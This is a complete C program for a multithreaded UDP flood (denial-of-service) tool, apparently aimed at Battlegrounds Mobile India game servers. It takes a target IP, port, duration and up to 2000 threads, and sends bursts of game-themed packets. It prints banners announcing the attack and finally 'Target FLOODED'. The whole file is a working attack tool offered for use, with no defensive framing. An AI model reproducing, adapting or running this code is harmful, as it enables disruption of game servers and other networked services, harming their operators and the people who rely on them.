#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>

#define PACKET_SIZE 1024
#define BURST_SIZE 50
#define VERSION "4.3 SEASON"

volatile int stop_attack = 0;

void handle_signal(int sig) {
    stop_attack = 1;
    printf("\n[!] Attack stopped - BGMI 4.3 Season Ended\n");
}

void show_banner() {
    printf("\n");
    printf("╔══════════════════════════════════════════════════════════════════╗\n");
    printf("║                    BGMI 4.3 SEASON ULTIMATE                      ║\n");
    printf("╠══════════════════════════════════════════════════════════════════╣\n");
    printf("║              PRIME ONYX - MAX POWER EDITION                       ║\n");
    printf("║                   Season 4.3 - Live Now                           ║\n");
    printf("╚══════════════════════════════════════════════════════════════════╝\n");
}

void usage() {
    show_banner();
    printf("\n╔══════════════════════════════════════════════════════════════════╗\n");
    printf("║ Usage: ./bgmi <IP> <PORT> <TIME> <THREADS>                        ║\n");
    printf("║ Example: ./bgmi 1.1.1.1 80 300 1000                               ║\n");
    printf("║ Max Time: 300 seconds (5 minutes)                                 ║\n");
    printf("║ Max Threads: 2000                                                 ║\n");
    printf("╚══════════════════════════════════════════════════════════════════╝\n\n");
    exit(1);
}

struct thread_data {
    char ip[16];
    int port;
    int duration;
    int thread_id;
    unsigned long long packets;
};

// BGMI 4.3 Style Payloads
unsigned char payloads[][PACKET_SIZE] = {
    // Payload 1 - BGMI Classic
    {0x16, 0x9e, 0x56, 0xc2, 0x4b, 0x47, 0x4d, 0x49, 0x20, 0x34, 0x2e, 0x33, 0x20, 0x53, 0x45, 0x41, 0x53, 0x4f, 0x4e},
    // Payload 2 - Erangel Map
    {0x16, 0x9e, 0x56, 0xc2, 0x45, 0x52, 0x41, 0x4e, 0x47, 0x45, 0x4c, 0x20, 0x4d, 0x41, 0x50, 0x20, 0x32, 0x30, 0x32},
    // Payload 3 - Livik Map  
    {0x16, 0x9e, 0x56, 0xc2, 0x4c, 0x49, 0x56, 0x49, 0x4b, 0x20, 0x4d, 0x41, 0x50, 0x20, 0x32, 0x30, 0x32, 0x34, 0x00},
    // Payload 4 - Sanhok Map
    {0x16, 0x9e, 0x56, 0xc2, 0x53, 0x41, 0x4e, 0x48, 0x4f, 0x4b, 0x20, 0x4d, 0x41, 0x50, 0x20, 0x4e, 0x45, 0x57, 0x00},
    // Payload 5 - Miramar Map
    {0x16, 0x9e, 0x56, 0xc2, 0x4d, 0x49, 0x52, 0x41, 0x4d, 0x41, 0x52, 0x20, 0x44, 0x45, 0x53, 0x45, 0x52, 0x54, 0x00},
};

void* udp_attack(void* arg) {
    struct thread_data* data = (struct thread_data*)arg;
    int sock;
    struct sockaddr_in target;
    char packet[PACKET_SIZE];
    time_t end_time;
    int payload_idx = 0;
    int num_payloads = sizeof(payloads) / sizeof(payloads[0]);
    
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return NULL;
    
    int opt = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    int buffer = 8 * 1024 * 1024;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buffer, sizeof(buffer));
    
    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(data->port);
    target.sin_addr.s_addr = inet_addr(data->ip);
    
    // Create random payload
    for (int i = 0; i < PACKET_SIZE; i++) {
        packet[i] = rand() % 256;
    }
    packet[0] = 0x16;
    packet[1] = 0x9e;
    packet[2] = 0x56;
    packet[3] = 0xc2;
    
    end_time = time(NULL) + data->duration;
    data->packets = 0;
    
    while (time(NULL) < end_time && !stop_attack) {
        for (int b = 0; b < BURST_SIZE && !stop_attack; b++) {
            // Use different payloads for better effect
            memcpy(packet, payloads[payload_idx % num_payloads], 64);
            if (sendto(sock, packet, PACKET_SIZE, 0, (struct sockaddr*)&target, sizeof(target)) < 0) {
                break;
            }
            data->packets++;
            payload_idx++;
        }
    }
    
    close(sock);
    return NULL;
}

int main(int argc, char* argv[]) {
    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);
    
    if (argc != 5) usage();
    
    char* ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = atoi(argv[4]);
    
    // Validate
    if (port < 1 || port > 65535) {
        printf("❌ Invalid port! Use 1-65535\n");
        return 1;
    }
    if (duration < 1 || duration > 300) {
        printf("❌ Invalid duration! Use 1-300 seconds (BGMI 4.3 max)\n");
        return 1;
    }
    if (threads < 1 || threads > 2000) {
        printf("❌ Invalid threads! Use 1-2000\n");
        return 1;
    }
    
    show_banner();
    
    printf("\n╔══════════════════════════════════════════════════════════════════╗\n");
    printf("║                     ATTACK CONFIGURATION                          ║\n");
    printf("╠══════════════════════════════════════════════════════════════════╣\n");
    printf("║ Target      : %s:%d\n", ip, port);
    printf("║ Duration    : %d seconds (%d minutes)\n", duration, duration/60);
    printf("║ Threads     : %d\n", threads);
    printf("║ Packet Size : %d bytes\n", PACKET_SIZE);
    printf("║ Burst Mode  : %d packets/cycle\n", BURST_SIZE);
    printf("║ Version     : BGMI %s\n", VERSION);
    printf("╚══════════════════════════════════════════════════════════════════╝\n\n");
    
    printf("🔥 BGMI 4.3 Attack Starting...\n");
    printf("🎯 Target Locked: %s:%d\n", ip, port);
    printf("⚡ Launching %d threads...\n\n", threads);
    
    pthread_t* tids = malloc(threads * sizeof(pthread_t));
    struct thread_data* data_array = malloc(threads * sizeof(struct thread_data));
    
    for (int i = 0; i < threads; i++) {
        strcpy(data_array[i].ip, ip);
        data_array[i].port = port;
        data_array[i].duration = duration;
        data_array[i].thread_id = i + 1;
        data_array[i].packets = 0;
        
        if (pthread_create(&tids[i], NULL, udp_attack, &data_array[i]) != 0) {
            printf("❌ Thread %d failed\n", i+1);
        }
    }
    
    printf("✅ All %d threads launched!\n", threads);
    printf("⏳ Attack running for %d seconds...\n", duration);
    printf("📊 Press Ctrl+C to stop\n\n");
    
    // Progress indicator
    for (int elapsed = 30; elapsed <= duration && !stop_attack; elapsed += 30) {
        sleep(30);
        if (!stop_attack) {
            int remaining = duration - elapsed;
            int percent = (elapsed * 100) / duration;
            printf("⏳ [%d%%] %d/%d sec | %d min %d sec remaining\n", 
                   percent, elapsed, duration, remaining/60, remaining%60);
        }
    }
    
    for (int i = 0; i < threads; i++) {
        pthread_join(tids[i], NULL);
    }
    
    unsigned long long total = 0;
    for (int i = 0; i < threads; i++) {
        total += data_array[i].packets;
    }
    
    printf("\n╔══════════════════════════════════════════════════════════════════╗\n");
    printf("║                    BGMI 4.3 ATTACK COMPLETED                      ║\n");
    printf("╠══════════════════════════════════════════════════════════════════╣\n");
    printf("║ Total Packets : %llu\n", total);
    printf("║ Average Speed : %llu packets/sec\n", total / duration);
    printf("║ Bandwidth     : %.2f MB/s\n", (double)(total * PACKET_SIZE) / (duration * 1024 * 1024));
    printf("║ Status        : ✅ Target FLOODED\n");
    printf("╚══════════════════════════════════════════════════════════════════╝\n");
    
    free(tids);
    free(data_array);
    
    return 0;
}
